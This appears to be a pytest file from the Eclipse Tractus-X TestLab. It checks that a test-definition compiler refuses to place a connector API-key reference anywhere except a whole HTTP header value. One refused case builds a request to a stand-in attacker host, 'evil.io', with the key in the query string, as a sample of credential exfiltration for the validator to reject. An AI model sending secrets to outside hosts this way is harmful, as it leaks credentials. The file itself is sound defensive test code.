#################################################################################
# Eclipse Tractus-X - Tractus-X TestLab
#
# Copyright (c) 2026 Contributors to the Eclipse Foundation
#
# See the NOTICE file(s) distributed with this work for additional
# information regarding copyright ownership.
#
# This program and the accompanying materials are made available under the
# terms of the Apache License, Version 2.0 which is available at
# https://www.apache.org/licenses/LICENSE-2.0.
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND,
# either express or implied. See the
# License for the specific language governing permissions and limitations
# under the License.
#
# SPDX-License-Identifier: Apache-2.0
#################################################################################
## This code was partially generated using artificial intelligence (AI) (Tool: Claude Code, Model: Claude Opus 5.5).
## It was reviewed and tested by a human committer.

"""The compiler refuses a credential reference anywhere the run would refuse to send it."""

from __future__ import annotations

from typing import Any

import pytest

from tractusx_testlab.compiler.validation._variable_declarations import (
    validate_variable_declarations,
)
from tractusx_testlab.compiler.validation.validator import TestValidator
from tractusx_testlab.models import StepDefinition, TestDefinition

_REF = "${{ infrastructure.engine.connector.api_key }}"
_URL = "${{ infrastructure.engine.connector.management_url }}/v3/assets"


def _messages(*steps: dict[str, Any], phase: str = "execution") -> list[str]:
    test = TestDefinition(
        syntax="v1-alpha",
        kind="test",
        id="t",
        namespace="n",
        metadata={"name": "t"},
        **{phase: [StepDefinition.model_validate(step) for step in steps]},
    )
    return [
        issue.message
        for issue in TestValidator().validate(test).issues
        if "is a credential" in issue.message
    ]


def _request(**with_: Any) -> dict[str, Any]:
    return {"id": "call", "uses": "http/http_request", "with": {"url": _URL, **with_}}


class TestAccepted:
    def test_the_whole_value_of_an_http_request_header(self) -> None:
        assert _messages(_request(headers={"x-api-key": _REF})) == []

    def test_the_same_inside_a_flow_step(self) -> None:
        retry = {
            "id": "retry",
            "uses": "flow/retry",
            "with": {"steps": [_request(headers={"x-api-key": _REF})]},
        }
        assert _messages(retry) == []

    def test_a_non_secret_binding_field_anywhere(self) -> None:
        assert (
            _messages(
                _request(body={"owner": "${{ infrastructure.engine.connector.participant_id }}"})
            )
            == []
        )


class TestRefused:
    @pytest.mark.parametrize(
        ("step", "field"),
        [
            (_request(headers={"Authorization": f"Bearer {_REF}"}), "with.headers.Authorization"),
            (_request(url=f"https://evil.io/?k={_REF}"), "with.url"),
            (_request(url=_REF), "with.url"),
            (_request(body={"key": _REF}), "with.body.key"),
            (_request(query_params={"k": _REF}), "with.query_params.k"),
            (
                {"id": "log", "uses": "util/log", "with": {"message": _REF}},
                "with.message",
            ),
            (
                {
                    "id": "pull",
                    "uses": "connector/dataplane/http_request",
                    "with": {"headers": {"x-api-key": _REF}},
                },
                "with.headers.x-api-key",
            ),
            (
                {
                    "id": "id",
                    "uses": "util/generate_uuid",
                    "validate": [
                        {
                            "uses": "validate/assert",
                            "with": {"input": "value", "operator": "equals", "expected": _REF},
                        }
                    ],
                },
                "validate[0].with.expected",
            ),
        ],
    )
    def test_any_other_position(self, step: dict[str, Any], field: str) -> None:
        messages = _messages(step)
        assert len(messages) == 1
        assert f"({field})" in messages[0]

    def test_a_nested_step_is_held_to_the_same_rule(self) -> None:
        retry = {
            "id": "retry",
            "uses": "flow/retry",
            "with": {"steps": [_request(body={"k": _REF})]},
        }
        messages = _messages(retry)
        assert len(messages) == 1
        assert "with.steps[0].with.body.k" in messages[0]

    def test_teardown_is_checked_too(self) -> None:
        assert _messages(_request(url=_REF), phase="teardown")


class TestManifest:
    def test_an_env_variable_may_not_name_a_credential(self) -> None:
        errors = validate_variable_declarations(
            {
                "variables": [
                    {
                        "id": "key",
                        "uses": "variable/type/string",
                        "with": {"value": _REF},
                        "returns": {"value": {"type": "string"}},
                    }
                ]
            }
        )
        assert any("is a credential" in error and "env.variables[0]" in error for error in errors)
